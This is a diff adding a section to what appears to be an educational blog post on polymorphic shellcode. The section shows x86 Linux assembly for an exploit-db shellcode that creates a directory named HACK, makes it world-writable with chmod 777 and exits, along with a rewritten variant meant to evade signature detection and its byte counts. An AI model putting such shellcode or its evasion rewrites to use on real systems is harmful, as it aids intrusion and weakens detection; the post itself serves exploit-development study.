@@ -72,7 +72,47 @@ Let's see a demo of the shellcode in action now:
 <script id="asciicast-WGxT2keT6AO81KpWMraSVUt4n" src="https://asciinema.org/a/WGxT2keT6AO81KpWMraSVUt4n.js" async></script>
 
 ## Second polymorphic shellcode - create dir + chmod 777 + exit
+[Here](https://www.exploit-db.com/exploits/37358) is the link to the original shellcode.
 
+Original shellcode:
+
+```nasm
+xor    eax, eax
+push   eax
+push   0x4b434148  #You can change it !
+mov    al, 0x27
+mov    ebx, esp
+inc    cx
+int    0x80
+mov    al, 0xf
+mov    cx, 0x1ff
+int    0x80
+xor    eax, eax
+inc    eax
+int    0x80
+```
+
+Polymorphic shellcode:
+
+```nasm
+xor eax, eax                             ; Clearing out EAX register
+push eax                                 ; PUSH for NULL termination
+push dword 0x4b434148                    ; PUSH dir name HACK
+mov al, 0x27                             ; Load 0x27 syscall val for mkdir in AL 
+mov ebx, esp                             ; Store address of TOS in EBX
+int 0x80                                 ; Executing mkdir syscall
+mov al, 0xf                              ; Load 0x0f syscall val for chmod in AL
+mov cx, 0x1ff                            ; Load permission to CX
+int 0x80                                 ; Executing chmod syscall
+inc eax                                  ; Incrementing val of EAX to 1 - exit
+int 0x80                                 ; Executing exit syscall
+```
+
+Length of original shellcode: `29 bytes`
+
+Length of polymorphic shellcode: `25 bytes`
+
+Size Reduction: `14%`
 
 
 
